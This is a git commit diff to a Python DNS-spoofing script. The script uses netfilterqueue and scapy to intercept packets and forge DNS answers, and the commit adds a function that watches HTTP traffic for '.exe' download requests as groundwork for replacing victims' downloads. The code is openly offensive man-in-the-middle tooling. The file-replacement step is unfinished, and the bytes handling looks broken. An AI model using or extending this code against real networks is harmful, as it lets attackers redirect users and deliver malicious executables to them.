a38def7ba8cc5b0b01287455e47777da83e57a08
remedybooks <remedybooks@gmail.com>
2025-05-22 18:16:18 -0700

    Added file replacement code

--- DNS_spoofing.py
+++ DNS_spoofing.py
@@ -3,9 +3,12 @@
 #Linux command: python DNS_spoofing.py
 #Configure a DNS server on maching, modify IP address, or forward request/modify response.
 #Find the A record --> rdata (raw data) for the specific website (qname)
+#seq and ack reconciliation
 
 import netfilterqueue
 import scapy.all as scapy
+
+ack_list = [] #file_override will add to the list
 def process_packet(packet):
     hacked_packet = scapy.IP(packet.get_payload())
     if hacked_packet.haslayer(scapy.DNSRR):
@@ -21,8 +24,22 @@ def process_packet(packet):
 
             packet.set_payload(bytes(hacked_packet))
 
-        #print(scapy_packet.show()) #print first to visualize IP
+        #print(hacked_packet.show()) #print first to visualize IP
         #Linux Command: ping -c 1 www.website.com --> IP of website.com
+    packet.accept()
+
+def file_override(packet):
+    hacked_packet = scapy.IP(packet.get_payload())
+    if hacked_packet.haslayer(scapy.Raw):
+        # print(hacked_packet.show()) #print first to visualize RAW layer
+        if hacked_packet[scapy.TCP].dport == 80: #request
+            if ".exe" in hacked_packet[scapy.Raw].load:
+                ack_list.append(hacked_packet[scapy.TCP].ack)
+            #print(hacked_packet.show())
+        elif hacked_packet[scapy.TCP].sport == 80:
+            if hacked_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(hacked_packet[scapy.TCP].seq)
+            #print(hacked_packet.show())
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
